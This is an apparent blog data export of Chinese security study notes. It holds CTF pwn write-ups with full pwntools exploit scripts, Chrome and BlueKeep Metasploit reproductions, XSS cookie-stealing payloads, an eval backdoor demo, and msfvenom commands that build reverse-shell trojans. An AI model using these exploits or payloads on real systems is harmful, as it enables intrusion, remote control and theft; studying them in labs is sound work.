{"meta":{"title":"Sinky's Blog","subtitle":"","description":"","author":"Sinky","url":"https://github.com/SinkyQ/sinkyhexo.github.io.git","root":"/SinkyQ/sinkyhexo.github.io.git/"},"pages":[{"title":"Sinky's Blog","date":"2022-08-08T03:20:20.867Z","updated":"2022-08-08T03:20:20.867Z","comments":false,"path":"about/index.html","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/about/index.html","excerpt":"","text":"联系方式v:Sinky94674关于我：一个正在找工作的二进制菜狗"}],"posts":[{"title":"PHP反序列化","slug":"pikachu-PHP反序列化","date":"2022-08-09T09:01:18.129Z","updated":"2022-08-09T09:13:29.458Z","comments":true,"path":"2022/08/09/pikachu-PHP反序列化/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/pikachu-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"概述序列化 serialize()序列化：把一个对象变成可以传输的字符串。 123456class S{public $test=\"pikachu\";}$s=new S;//创建一个对象serialize($s);//把这个对象进行序列化?&gt; 结果：O:1:”S”:1:{s:4:”test”;s:7:”pikachu”;} O:代表object 1:代表对象名字长度为一个字符 S:对象的名称 1:代表对象里面有一个变量 s:数据类型 4:变量名称的长度 test:变量名称 s:数据类型 7:变量值的长度 pikachu:变量值 （什么鬼，没懂） 反序列化 unserialize()就是把序列化的字符串还原为对象，然后在接下来的代码中继续使用。 $u=unserialize(\"0:1:\"S\":1{s:4:\"test\":s:7:\"pikachu\";}\"); echo $u ‐&gt; test;//得到结果为pikachu 序列化和反序列化本身没有问题，但如果反序列化的内容是用户可以控制的，且后台不正当的使用了PHP中的魔法函数，就会导致安全问题。 常见的魔法函数： __construct() 当一个对象创建时被调用 __destruct() 当一个对象销毁时被调用 __toString() 当一个对象被当作一个字符串使用 __sleep() 在对象在被序列化之前运行 __wakeuop 将在序列化之后立即被调用 实验12345678910111213141516171819//定义类class test{//在对象被销毁时候自动调用destruct函数function __destruct(){echo \"&lt;br&gt;__destruct()&lt;br&gt;\";//在此函数中添加eval()以达到命令执行的目的eval($_GET['cmd']);}}//echo serialize($test);方便将序列化后的test写进u参数中传参$test = new test;echo serialize($test);//执行完这个echo后会被垃圾回收器回收，也就是销毁unserialize($_GET['u']);//反序列化执行完后又会被回收// 所以会出现两次destruct?&gt; 传参: http://localhost/phptest.php?O:4:\"test\":0:{}&amp;cmd=system(\"woami\"); 利用成功。 php反序列化漏洞 随便提交点啥字符串，提示“大兄弟，来点劲爆点儿的” 提交了一串序列化字符串，回显是反序列化后的。没啥思路，看一下后台代码。 将XSS字符串 &lt;script&gt;alert('xss')&lt;/script&gt; 序列化一下： O:1:\"S\":1:{s:4:\"test\";s:29:\"&lt;script&gt;alert('xss')&lt;/script&gt;\";} 提交，成功","categories":[],"tags":[{"name":"pikachu","slug":"pikachu","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pikachu/"}]},{"title":"pikachu-CSRF","slug":"pikachu-CSRF","date":"2022-08-09T08:30:06.517Z","updated":"2022-08-09T08:51:43.331Z","comments":true,"path":"2022/08/09/pikachu-CSRF/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/pikachu-CSRF/","excerpt":"","text":"CSRFCSRF 跨站请求伪造，在csrf攻击场景中攻击者会伪造一个请求，欺骗目标用户进行点击，用户一旦点击这个请求，整个攻击就完成了，所以csrf攻击也成为”one click”攻击. csrf攻击满足的条件1、网站没有对个人的信息修改的请求进行防csrf处理，导致请求容易被伪造 2.用户在登录后台的情况下，点击了攻击者发送的链接，如果用户没登陆或没点连接都不会成 csrf与xss的区别csrf是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而xss是直接盗取到了用户的权限，然后实施破坏。 如何确认一个web系统存在csrf漏洞1.对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以被伪造 修改管理员账号时，并不需要验证旧密码，导致请求容易被伪造； 对于敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造； 2.确认凭证的有效期 虽然退出或关闭了浏览器，但cookie仍然有效，或者session并没有及时国企，导致csrf攻击变得简单。 CSRF(get)登录账号，抓取修改个人信息流量包。 发现参数可以直接被修改，未做任何确认机制，可以直接将url伪装成各种html让受害者点击。 可以构造出CSRF攻击URL,诱使登录状态的用户点击url就可以完成CSRF攻击。 如果修改信息的请求方式是POST型的，攻击者则不能通过构造恶意url来攻击。类似于xss的post型攻击，攻击者会构造一个自己的攻击站点（服务器），站点上有一个poat.html，诱使用户点击该地址。当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息，从而完成攻击。 步骤同get。 正常登录状态： 点击恶意url后，用户信息直接被修改 CSRF(Token)token: 每次请求都增加一个随机码（需要够随机，不容易被伪造），后台每次对这个随机码进行验证，这个随机码就是token。 如图获取修改信息流量包后发现增加了token，无法利用。 防范CSRF措施 增加token验证：对关键操作增加token参数，token值必须随机，每次都不一样 安全的会话管理（避免会话被利用） 不要再客户端保存敏感信息（身份认证信息） 测试直接关闭，退出时的会话过期机制（一般是15-20分钟），无操作则自动登入超时。 访问控制安全管理 敏感信息修改时需要对身份进行二次认证（如修改账号时需要判断旧密码） 敏感信息的修改尽量使用post（post安全性高于get） 通过http头部中的referer来限制页面（修改个人信息的referer必须来自本域，不可来自其他域或无referer） 增加验证码：一般用在登录（防暴力破解），也可用于其他重要信息操作的表单中。","categories":[],"tags":[{"name":"pikachu","slug":"pikachu","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pikachu/"}]},{"title":"CVE-2019-5786","slug":"CVE-2019-5786","date":"2022-08-09T08:02:35.739Z","updated":"2022-08-09T08:03:08.820Z","comments":true,"path":"2022/08/09/CVE-2019-5786/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/CVE-2019-5786/","excerpt":"","text":"前言： 这个漏洞是我第一个自己进行复现和尝试写exp的洞，我希望在未来我能够对于复现漏洞和写exp能像吃饭喝水一样自信！加油！ 环境kali win7_x86 Google_chrome_(32bit)_v72.0.3626.119 浏览下载链接推荐：https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe 复现：kali启动msf,搜索chrome_filereader利用模块。(据谷歌官方公示，CVE-2019-5786是位于FileReader中的UAF漏洞) root@kali:~# msfconsole -q msf5 &gt; search chrome_filereader 注：1.msfconsole -q 是指启动工具msf，-q 不打印没用的东西出来（msf启动界面）之后可能需要专门整理一下有关msf工具的知识。2.search chrome_filereader正则匹配搜索exp。exp存在则浮现。3.什么是UAF漏洞：内存破坏漏洞，通常存在于浏览器中，详细可见博客文章“UAF漏洞简单学习” 出现exp: exploit/filereader/browser/chrome_filereader_uaf 简单了解FileReader对象的用法Filereader 可以实现对文件内容或者缓冲区数（Blob）的异步读取 readyState：表示读取状态 empty,0,尚未读取 loading,1,正在读取 done,2,读取完成 result：表示读取结果，具体格式与读取方式有关： readAsArrayBuffer readAsBinaryString readAsDataURL readAsText onprogress：回调函数 读取Blob触发 当数据较多时会周期性触发多次 onloadend：回调函数 读取操作完成时触发，不论读取成功或失败 查看模块信息 漏洞介绍： 123456789101112Payload information:Description: This exploit takes advantage of a use after free vulnerability in Google Chrome 72.0.3626.119 running on Windows 7 x86. The FileReader.readAsArrayBuffer function can return multiple references to the same ArrayBuffer object, which can be freed and overwritten with sprayed objects. The dangling ArrayBuffer reference can be used to access the sprayed objects, allowing arbitrary memory access from Javascript. This is used to write and execute shellcode in a WebAssembly object. The shellcode is executed within the Chrome sandbox, so you must explicitly disable the sandbox for the payload to be successful. 选择payload -&gt; set payload windows/meterpreter/reverse_tcp 注：meterpreter/reverse_tcp：基于TCP的反向链接反弹shell，详细见文章“初识Meterpreter” 设置payload参数：LHOST为kali ip -&gt; set LHOST 192.168.119.128 创建服务 -&gt; set payload windows/meterpreter/reverse_tcp 启动服务：run 或者exploit 在win7下进入chrome文件目录，在目录下进去cmd，并以沙箱关闭状态执行chrome.exe -&gt; chrome.exe --no-sandbox 在弹出的chome浏览器中访问kali ip: http://192.168.119.128:8080 kali获得sessions查看sessions序号，通过反弹shell在win7上可执行命令。复现结束。 后记在获取session时候我遇见了很多小问题导致我不能获取，比如win7应该是x86系统，比如win7的防火墙忘记关闭了，比如网速太慢，在历经无数崩溃瞬间我成功的获取了session.虽然后来再整理wp的时候，win7系统由于自动更新，chrome119版本也升级了，后来再安装却死活安装不上去，差点升天…… EXPexp太长了并且看不懂，等我后面有机会再整理。这边放其他大佬整理出来的exp。 https://github.com/exodusintel/CVE-2019-5786","categories":[],"tags":[{"name":"chrome_bug","slug":"chrome-bug","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/chrome-bug/"}]},{"title":"CVE-2019-0708","slug":"CVE-2019-0708","date":"2022-08-09T04:25:01.135Z","updated":"2022-08-09T04:22:13.980Z","comments":true,"path":"2022/08/09/CVE-2019-0708/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/CVE-2019-0708/","excerpt":"","text":"2019年5月14日爆出CVE-2019-0708漏洞，高危漏洞，影响范围较广，通过远程桌面端口3389，RDP协议进行攻击。 影响系统：windows 2003、windows 2008、windows 2008 R2、windows xp、win7 蓝屏环境攻击机：kali IP：192.168.119.128 靶机：win7 IP:192.168.119.139 (开放3389端口) 工具：RDP漏洞扫描工具、MSF POC：https://github.com/n1xbyte/CVE-2019-0708 复现nmap对win7端口扫描: RDP工具在win7上扫描靶机:0708detector.exe -t 192.168.119.139 -p 3389 启动MSF查找漏洞： search 0708 利用漏洞扫描模块： use auxiliary/scanner/rdp/cve_2019_0708_bluekeep 查看参数： show options 设置靶机IP： set rhosts 192.168.119.139 运行：run 漏洞攻击在kali中安装pip3,安装impacket库。下载poc。切进目录CVE-2019-0708 开始攻击： python3 crashpoc.py 192.168.119.139 64(系统类型) 攻击成功，win7变为蓝屏。 知识点RDP协议RDP,远程显示协议。传输方式：tcp/ip。提供了客户和服务器之间的连接。映像会话。基本层次结构： 网络连接层：RDP协议建立在tcp/ip协议之上，由于传输的数据量比较大，因此在协议的底层首先定义一层网络连接层，它定义了一个完整的RDP数据逻辑包，以避免由于网络包长度过长而被分割使数据丢失。 ISO数据层：在网络连接层之上是ISO数据层，标识RDP数据的正常连接通信。 虚拟通道层：在ISO数据层之上，RDP协议定义一个虚拟通道层，用以拆分标示不同虚拟通道的数据，加快客户端处理速度，节省占用网络接口的时间。 加密解密层：在虚拟通道层之上，RDP定义一个数据加密解密层，此层用于对所有的功能数据进行加密解密处理。 功能数据层：在加密解密层之上是功能数据，画面信息，本地资源转换，声音数据，打印数据等所有的功能数据信息都在此层进行处理。另外，根据数据类型的不同，这些数据都有各自不同层次的分割， 连接过程说明： 客户端连接服务器 ISO数据层建立连接 发送初始协议相关信息，接收加密、解密秘钥 虚拟通道申请 加密形式发送客户端系统信息，同时验证加密协议 平台软件证书验证 各功能建立连接，各功能数据传输，功能实现。","categories":[],"tags":[{"name":"windows漏洞","slug":"windows漏洞","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/windows%E6%BC%8F%E6%B4%9E/"}]},{"title":"攻防世界-pwn-反应釜开关控制","slug":"攻防世界-pwn-反应釜开关控制","date":"2022-08-09T04:18:04.404Z","updated":"2022-08-09T04:16:57.525Z","comments":true,"path":"2022/08/09/攻防世界-pwn-反应釜开关控制/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/","excerpt":"","text":"checksec: 可以修改GOT表 可以通过一处的方式来更改程序运行流 堆栈不可执行 地址随机化未开启 分析IDA查看，发现有/bin/sh。 get函数可溢出，偏移由v5得0x200h+0x8h(偏移对齐)=0x208h expexp: from pwn import * r = remote('220.249.52.133',39331) elf = ELF('./control') shell_addr = 0x04005F6 payload = 'A'*0x208 + p64(shell_addr) r.sendline(payload) r.interactive() 后记看了一下大佬的wp，结果原来是盲打题……","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pwn/"}]},{"title":"有关XSS跨站脚本","slug":"有关XSS跨站脚本","date":"2022-08-09T04:10:35.381Z","updated":"2022-08-09T04:10:16.791Z","comments":true,"path":"2022/08/09/有关XSS跨站脚本/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%9C%89%E5%85%B3XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/","excerpt":"","text":"XSS(跨站脚本)原理与分类跨站脚本攻击XSS,为了不和层叠样式表的缩写混淆，故将跨站脚本攻击缩写为XSS,恶意攻击者往web页面里插入恶意script代码，当用户浏览页面时嵌入其中的script代码被执行，从而恶意攻击用户。 XSS攻击针对的是用户层面的攻击. 反射型：交互的数据一般不会被存在数据库里，一次性，一般出现在查询页面等。 存储型：交互的数据会被存在数据库里面，永久性存储，一般出现在留言板，注册等页面。 DOM型：不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题，一次性，也属于反射型。 XSS漏洞测试流程1.在目标上找输入点，比如查询接口、留言板 2.输入一组“特殊字符（&gt;,’,”等）+唯一识别字符”，点击提交后，查看返回源码，看后端返回数据是否有处理。 3.通过搜索定位到唯一字符，结合唯一字符前后语法确定是否可以构造执行js的调教（构造闭合） 4.提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，成功执行证明存在xss漏洞。 XSS的攻击载荷 &lt;script&gt;：最直接的xss有效载荷，脚本标记可以引用外部的javascript代码，也可以将代码插入脚本标记中。 src12&lt;script&gt;alert(\"hack\")&lt;/script&gt; #弹出hack&lt;script&gt;alert(document.cookie)&lt;/script&gt; #弹出cookie &lt;img&gt;：1234567&lt;img src=1 onerror=alert(\"hack\")&gt;&lt;img src=1 onerror=alert(/hack/)&gt;&lt;img src=1 onerror=alert(document.cookie)&gt; #弹出cookie&lt;img src=1 onerror=alert(123)&gt; 注：对于数字，可以不用引号&lt;img src=\"javascript:alert(\"XSS\");\"&gt;&lt;img dynsrc=\"javascript:alert('XSS')\"&gt;&lt;img lowsrc=\"javascript:alert('XSS')\"&gt;","categories":[],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/XSS/"}]},{"title":"攻防世界-dice_game","slug":"攻防世界-pwn-dice_game","date":"2022-08-09T04:08:11.395Z","updated":"2020-09-10T07:29:13.960Z","comments":true,"path":"2022/08/09/攻防世界-pwn-dice_game/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/","excerpt":"","text":"0x01 Checkseclinux下checksec查壳，开启了relro nx pie防护： 0x02 分析IDA打开，主函数： 123456789101112131415161718192021222324252627282930313233343536373839__int64 __fastcall main(__int64 a1, char **a2, char **a3){ char buf[55]; // [rsp+0h] [rbp-50h] char v5; // [rsp+37h] [rbp-19h] ssize_t v6; // [rsp+38h] [rbp-18h] unsigned int seed[2]; // [rsp+40h] [rbp-10h] unsigned int v8; // [rsp+4Ch] [rbp-4h] memset(buf, 0, 0x30uLL); *(_QWORD *)seed = time(0LL); printf(\"Welcome, let me know your name: \", a2); fflush(stdout); v6 = read(0, buf, 0x50uLL); if ( v6 &lt;= 49 ) buf[v6 - 1] = 0; printf(\"Hi, %s. Let's play a game.\\n\", buf); fflush(stdout); srand(seed[0]); v8 = 1; v5 = 0; while ( 1 ) { printf(\"Game %d/50\\n\", v8); v5 = sub_A20(); fflush(stdout); if ( v5 != 1 ) break; if ( v5 ) { if ( v8 == 50 ) { sub_B28(buf); break; } ++v8; } } puts(\"Bye bye!\"); return 0LL;} 是一个srand函数程序，输入与随机出来的数匹配，则将进入flag的函数。 12345678910int __fastcall sub_B28(__int64 a1){ char s; // [rsp+10h] [rbp-70h] FILE *stream; // [rsp+78h] [rbp-8h] printf(\"Congrats %s\\n\", a1); stream = fopen(\"flag\", \"r\"); fgets(&amp;s, 100, stream); puts(&amp;s); return fflush(stdout);} 在输入name时，令输入数据覆盖srand函数内部随机种子，就可以控制随机数的生成。 随机树种子地址与输入名字的buf地址之间相差0x40,所以将seed覆盖掉 0x03 exp12345678910111213141516from pwn import *from ctypes import *p=remote('220.249.52.133',34691)libc=cdll.LoadLibrary(\"libc.so.6\")p.recv()payload=0x40*'a'+p64(0)p.sendline(payload)a=[]for i in range(50): a.append(libc.rand()%6+1)print(a)for i in a: p.recv() print(p.recv()) p.sendline(str(i))p.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pwn/"}]},{"title":"攻防世界 string","slug":"攻防世界pwn-string","date":"2022-08-09T04:06:35.328Z","updated":"2020-09-10T07:29:14.011Z","comments":true,"path":"2022/08/09/攻防世界pwn-string/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/","excerpt":"","text":"checksec 查看保护机制 注：开启Full RELRO，无法修改got表；开启Canary found，不能直接用溢出方法覆盖栈中返回地址，要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过；开启NX,意味着栈中数据没有执行权限；PIE未开启，基地址不会变化，为0x400000. 思路分析IDA64查看，在sub_400CA6()中发现：v1被强制转换成函数指针类型。 注： ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1); 就是将v1强制转换为一个函数指针 其满足条件为 a1==a1[1]，回溯发现，a1为函数sub_400D72()函数的参数，即，a1为v5. 可看出，v4=v5,且*v4=68;v4[1]=85;也就是说，a1=68,a1[1]=85.所以我们要修改a1值令a1=85 按流程分析：在sub_400A7D()中，满足s1==“east”，则跳出函数。 在sub_400BB9()中发现格式化字符串漏洞（可以进行任意地址改写） printf(&amp;format, &amp;format); 通过此处可修改v4[0]值，现在需要确定v4[0]地址。在main()函数中，打印的secret[0]正是v5,即v4[0]地址。 攻击思路通过格式化字符串漏洞赋值a1为85，使if条件成真，执行我们传入的shellcode拿到shell。 函数调用约定：linux_x64下，参数从左到右放入寄存器：RDI,RSI,RDX,ECX,R8,R9,当参数为7个以上时，前面6个与前面一样，但后面的以此从“右向左”放入栈中。 利用pwntools自带的shellcodecraft工具，生成amd64架构下的shellcode，拿到shell. Pwntools shellcraft模块：是shellcode的模块，包含一些生成shellcode的函数，子模块声明架构（如：shellcode.arm是ARm架构；shellcraft.amd64是AMD64架构；shellcraft.common是所有架构通用） printf(shellcraft.sh()) #打印出shellcodeprintf(asm(shellcraft.sh())) #打印出汇编后的shellcode 用gdb调试程序，在printf下断点，输入%x测试，发现输出如图： 填写address时我输入的是56（0x38），也就是[rsp+16]的位置，即格式化字符串的第7个参数（printf的第8个参数） conext.log_level=”debug” 脚本在执行时输出debug的信息，可以通过观察这些信息查找哪步出错 补：之前不知道sh.recv(7),16是什么意思，现在补充，就是sendline自带换行符，所以要把\\n过滤掉，7是因为v3就是打印的6个书，换行符是第7位，16代表十六进制。 exp： 1234567891011121314151617181920from pwn import* #sh=process('./string')sh=remote('111.198.29.45',36129)context.log_level='debug'sh.recvuntil('secret[0] is')v3_addr=int(sh.recv(7),16)sh.recvuntil('name be:')sh.sendline('zzz')sh.recvuntil('east or up?:')sh.sendline('east')sh.recvuntil('leave(0)?:')sh.sendline('1')sh.recvuntil('\\'Give me an address\\'')sh.sendline(str(v3_addr))sh.recvuntil('you wish is:')payload='%085c'+'%7$n'sh.sendline(payload)sh.recvuntil('I will help you! USE YOU SPELL')sh.sendline(asm(shellcraft.amd64.linux.sh(),arch=\"amd64\"))sh.interactive() cyberpeace{962a040a22938025e2ad4bbe3e5b56d3}","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pwn/"}]},{"title":"攻防世界-pwn-stack2","slug":"攻防世界-pwn-stack2","date":"2022-08-09T04:04:51.567Z","updated":"2020-09-10T07:29:13.976Z","comments":true,"path":"2022/08/09/攻防世界-pwn-stack2/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-stack2/","excerpt":"","text":"0x01 分析checksec检查： 32位，无PIE，开了NX和canary.运行一下是只有五个模块，展示数字，添加，更改，求平均数，退出。 IDA中查看main函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374int __cdecl main(int argc, const char **argv, const char **envp){ int v3; // eax unsigned int v5; // [esp+18h] [ebp-90h] unsigned int v6; // [esp+1Ch] [ebp-8Ch] int v7; // [esp+20h] [ebp-88h] unsigned int j; // [esp+24h] [ebp-84h] int v9; // [esp+28h] [ebp-80h] unsigned int i; // [esp+2Ch] [ebp-7Ch] unsigned int k; // [esp+30h] [ebp-78h] unsigned int l; // [esp+34h] [ebp-74h] char v13[100]; // [esp+38h] [ebp-70h] unsigned int v14; // [esp+9Ch] [ebp-Ch] v14 = __readgsdword(0x14u); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); v9 = 0; puts(\"***********************************************************\"); puts(\"* An easy calc *\"); puts(\"*Give me your numbers and I will return to you an average *\"); puts(\"*(0 &lt;= x &lt; 256) *\"); puts(\"***********************************************************\"); puts(\"How many numbers you have:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"Give me your numbers\"); for ( i = 0; i &lt; v5 &amp;&amp; (signed int)i &lt;= 0x63; ++i ) { __isoc99_scanf(\"%d\", &amp;v7); v13[i] = v7; } for ( j = v5; ; printf(\"average is %.2lf\\n\", (double)((long double)v9 / (double)j)) ) { while ( 1 ) { while ( 1 ) { while ( 1 ) { puts(\"1. show numbers\\n2. add number\\n3. change number\\n4. get average\\n5. exit\"); __isoc99_scanf(\"%d\", &amp;v6); if ( v6 != 2 ) break; puts(\"Give me your number\"); __isoc99_scanf(\"%d\", &amp;v7); if ( j &lt;= 0x63 ) { v3 = j++; v13[v3] = v7; } } if ( v6 &gt; 2 ) break; if ( v6 != 1 ) return 0; puts(\"id\\t\\tnumber\"); for ( k = 0; k &lt; j; ++k ) printf(\"%d\\t\\t%d\\n\", k, v13[k]); } if ( v6 != 3 ) break; puts(\"which number to change:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"new number:\"); __isoc99_scanf(\"%d\", &amp;v7); v13[v5] = v7; } if ( v6 != 4 ) break; v9 = 0; for ( l = 0; l &lt; j; ++l ) v9 += v13[l]; } return 0;} 发现没有检查v13数组边界，当选择3.change number时程序没有对v5进行检测，存在数组越界，产生溢出： 12345puts(\"which number to change:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"new number:\"); __isoc99_scanf(\"%d\", &amp;v7); v13[v5] = v7; 发现给了/bin/bash: 12345678910111213141516:0804859B ; __unwind {.text:0804859B push ebp.text:0804859C mov ebp, esp.text:0804859E sub esp, 18h.text:080485A1 mov eax, large gs:14h.text:080485A7 mov [ebp+var_C], eax.text:080485AA xor eax, eax.text:080485AC sub esp, 0Ch.text:080485AF push offset command ; \"/bin/bash\".text:080485B4 call _system ;system.text:080485B9 add esp, 10h.text:080485BC nop.text:080485BD mov edx, [ebp+var_C].text:080485C0 xor edx, large gs:14h.text:080485C7 jz short locret_80485CE.text:080485C9 call ___stack_chk_fail 开启动态调试，在v13[v5]=v7处下断点， 转到IDA界面，查看此地址，此时edx存入的即为输入的数字9，在栈中的位置是： 得到了输入在栈中的位置，找到返回地址的位置覆盖掉就可以了。","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pwn/"}]},{"title":"攻防世界 level3","slug":"攻防世界-pwn-level3","date":"2022-08-09T04:01:34.298Z","updated":"2020-09-10T07:29:13.974Z","comments":true,"path":"2022/08/09/攻防世界-pwn-level3/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-level3/","excerpt":"","text":"这道题对于我来讲好难好难啊，涉及到了很多新的知识。首先checksec :可以直接栈溢出；基地址不变化；对数据有执行权限。 查看main()函数： 查看函数function()： 无system,无/bin/sh，给了一个共享文件libc_32.so.6,明显为ret2libc。 ret2libc (return-into-libc)是一种利用缓冲区溢出的代码复用技术，主要通过覆盖栈帧的返回地址（EIP），使其返回到系统中的库函数，利用库函数中已有的功能来实施attack，而不是直接定位到注入的shellcode。system函数属于libc，而libc.so动态链接库中的函数之间相对偏移是固定的。即使程序有ASLR保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变，用工具来找到对应的libc文件。 ret2libc特征：1、没有/bin/sh；2、没有system和/bin/sh；3、无system和/bin/sh，但是给了libc.so文件；4、这三个全都没有。 ASLR：地址空间布局随机化，ios,android,windows,macos,linux的当前版本都具有ASLR保护。主要用于防止缓冲区溢出攻击，ASLR与虚拟内存管理一起工作，将程序的不同部分的位置随机化，令攻击者不能通过尝试和错误了解目标位置，因为地址将不同。 read()函数中，buf大小为0x88，但是在函数中竟然规定了256之大。明显的栈溢出。 攻击思路libc内的地址是随机的，但是函数的相对地址是不变的，只要知道其中某一个函数的地址，再利用相对位移计算出我们所需要的函数的地址，如果知道read或write函数的地址就可以计算出其他函数的地址。 某大佬攻击思路： （1）通过function()中的read构造栈溢出，并且覆写返回地址为plt中的write地址。（2）通过wirte泄露read在内存中的绝对地址，并且接着调用function()（注：got中的read保存着read在内存中的真实地址）（3）计算出system和/bin/sh的绝对地址，再通过function构造栈溢出进行覆写。（4）成功 plt：procedure Linkage Table，延迟绑定，函数第一次用到时才进行绑定（符号查找，重定位等）；实现手法：增加一层间接跳转。调用函数时并不直接通过GOT跳转，而是通过一个叫做PLT的项的结构来进行跳转，每个外部函数在PLT中都有一个相应的项。ELF将GOT拆分成两个表叫做.got和.got.plt。.got用来保存全局变量引用的地址.got.plt用来保存函数引用的地址，外部函数的引用全部放到 .plt.got中。 思路 通过read覆盖返回地址没执行两次main函数，第一次泄露write函数的地址，第二次执行system函数。 exp: 123456789101112131415161718192021222324252627282930313233343536from pwn import*p=remote('111.198.29.45',52277) # p=process(\"./level3\") # 获取文件对象elf=ELF('./level3') #获取lib库对象libc=ELF('./libc_32.so.6') #获取函数wirte_plt=elf.plt['write']write_got=elf.got[write']main_addr=elf.sym['main'] #接受数据p.recvuntil(\":\\n\") #char[88],ebp write函数地址，write函数返回地址（返回到main函数） write函数参数一（1） write函数参数二（write_got的地址）write参数三（写4字节）payload=0x88*'a'+p32(0xdeadbeef)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)p.sendline(payload) #获取wirte在got中的地址write_got_addr=u32(p.recv())print hex(write_got_addr) # 计算lib库加载基址libc_base=write_got_addr-libc.sym['write']print hex(libc_base) # 计算system的地址system_addr=libc_base+libc.sym['system']print hex(bin_sh_addr) #计算字符串/bin/sh 的地址。0x15902b为偏移，通过命令：strings -a -t x libc_32.so.6 | grep \"/bin/sh\"获取bin_sh_addr=libc_base+0x15902bprint hex(bin_sh_addr) #char [88] ebp system system函数的返回地址 system函数的参数(bin_sh_addr)payload2=0x88*'a'+p32(0xdeadbeef)+p32(system_addr)+p32(0x11111111)+p32(bin_sh_addr) #接受数据p.recvuntil(\":\\n\") #发送payloasp.sendline(payload2) #切换交互模式p.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pwn/"}]},{"title":"初识Meterpreter","slug":"初识Meterpreter","date":"2022-08-09T03:50:57.231Z","updated":"2022-08-09T03:51:12.837Z","comments":true,"path":"2022/08/09/初识Meterpreter/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E5%88%9D%E8%AF%86Meterpreter/","excerpt":"","text":"什么是Meterpretermetrepreter 是metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道，使用它作为攻击载荷能够获得目标系统的一个meterpreter shell的链接。 meterpreter shell作为渗透模块有很多有用的功能，如：添加用户、隐藏、打开shell、得到用户密码、上传下载远程主机文件、运行cmd、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息 网络接口 ip地址等信息。Meterpreter能够躲避入侵检测系统，在远程主机上隐藏自己，不改变系统硬盘中的文件Meterpreter 是一种后渗透工具，属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型payload，此工具基于内存DLL注入理念实现，通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。攻击者与目标设备中Meterpreter的通信是通过Stager套接字实现。 Meterpreter中常用反弹类型1.reverse_tcp基于TCP的反向链接反弹shell，使用稳定。 Linux: linux下反弹shell木马： msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f elf -o shell 目录下生成木马文件isshell，为文件加可执行权限，打开metasploit，使用模块handler设置payload(与生成木马所使用payload一致) 设置地址和端口，开始监听。 运行反弹shell木马，成功反弹回shell Windows: msfvenom -p windows/meterpreter/reverse_tcp lhost=[你的ip] lport=[端口] -f exe -o [要生成的文件名] msfvenom -p windows/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f exe -o shell.exe 2.reverse_http基于http方式的反向连接，网速慢的情况下不稳定。 payload: /windows/meterpreter/reverse_http 3.reverse_https基于https方式的反向连接，网速慢的情况下不稳定，https若反弹没收到数据，可以将监听端口换成443试试。 payload: 